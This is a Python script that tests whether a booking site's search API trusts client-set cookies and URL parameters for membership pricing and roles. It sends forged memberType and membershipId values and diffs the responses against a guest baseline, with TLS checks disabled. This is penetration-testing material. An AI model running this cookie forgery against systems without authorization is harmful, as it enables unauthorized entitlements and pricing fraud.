#!/usr/bin/env python3
"""
cookie_diff.py — Differential client-state/entitlement tester skeleton.

Proves whether a server trusts client-set cookies/params for entitlements
(member pricing, rate plans, discounts, roles) WITHOUT server-side validation.

Usage:
  Edit CONFIG at the top for your target, then run:
      python cookie_diff.py

Output:
  - One JSON summary per state, and a diff of the baseline vs privileged states
    (changed fields, added fields like memberUrl/memberLabel/ratePlan IDs,
     response size delta).

Evidence note: only prints what the server ACTUALLY returned. Do not fabricate.
"""
import json
import sys
import time

try:
    import httpx
except ImportError:
    sys.exit("pip install httpx")

# ============ CONFIG — edit per target ============
BASE = "https://target.example.com"
ENDPOINT = "/api/search"
# httpx params dict (note: use REAL param names from the JS bundle, not guesses)
QUERY = {"resortIds": "72447", "startDate": "2026-10-01", "endDate": "2026-10-05",
         "adults": "2", "kids": "0", "type": "s"}
REFERER = BASE + "/some/widget-page.html"
HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "application/json"}

# List of (label, cookies_dict, url_params_override)
STATES = [
    ("guest", None, None),
    ("memberType-only", {"memberType": "RACV_CLUB_MEMBER"}, None),
    ("memberType+id", {"memberType": "RACV_CLUB_MEMBER", "membershipId": "1"}, None),
    ("memberType=RACV_MEMBER+id", {"memberType": "RACV_MEMBER", "membershipId": "1"}, None),
    # Optional: same state but as URL params, to prove param-vs-cookie precedence
    ("param-memberType", None, {"memberType": "RACV_CLUB_MEMBER"}),
]
# ========================================================

def fetch(state_label, cookies, param_override):
    params = dict(QUERY)
    if param_override:
        params.update(param_override)
    r = httpx.get(BASE + ENDPOINT, params=params, cookies=cookies,
                  headers=HEADERS, verify=False, timeout=30)
    try:
        return r.status_code, r.json(), len(r.content)
    except Exception:
        return r.status_code, r.text[:500], len(r.content)


def walk_diff(a, b, path=""):
    """Return list of human-readable diffs between dict/list trees a (baseline) vs b (state)."""
    out = []
    if isinstance(a, dict) and isinstance(b, dict):
        for k in set(list(a.keys()) + list(b.keys())):
            if k not in a:
                out.append(f"  + {path}{k} = {str(b[k])[:120]}")
            elif k not in b:
                out.append(f"  - {path}{k} (present in baseline only)")
            else:
                out.extend(walk_diff(a[k], b[k], f"{path}{k}."))
    elif isinstance(a, list) and isinstance(b, list):
        if len(a) != len(b):
            out.append(f"  ~ {path} length {len(a)} -> {len(b)}")
        for i in range(min(len(a), len(b))):
            out.extend(walk_diff(a[i], b[i], f"{path}[{i}]."))
    else:
        if a != b:
            out.append(f"  ~ {path} {str(a)[:80]} -> {str(b)[:80]}")
    return out


def main():
    baseline = None
    for label, cookies, override in STATES:
        status, body, size = fetch(label, cookies, override)
        print(f"[{status}] {label:22} bytes={size}")
        if isinstance(body, str):
            print("   body(snippet):", body[:300])
            continue
        # quick highlights
        j = json.dumps(body)
        for hot in ("memberUrl", "memberLabel", "RatePlan", "minPrice", "maxPrice",
                    "discount", "identifier=", "ihotelier"):
            if hot in j:
                i = j.find(hot)
                print(f"   {hot}: ...{j[max(0, i-30):i+120]}...")
        if baseline is None:
            baseline = body
        else:
            diffs = walk_diff(baseline, body)
            print(f"   diff vs guest: {len(diffs)} change(s)")
            for d in diffs[:15]:
                print("   ", d)
        time.sleep(0.5)


if __name__ == "__main__":
    main()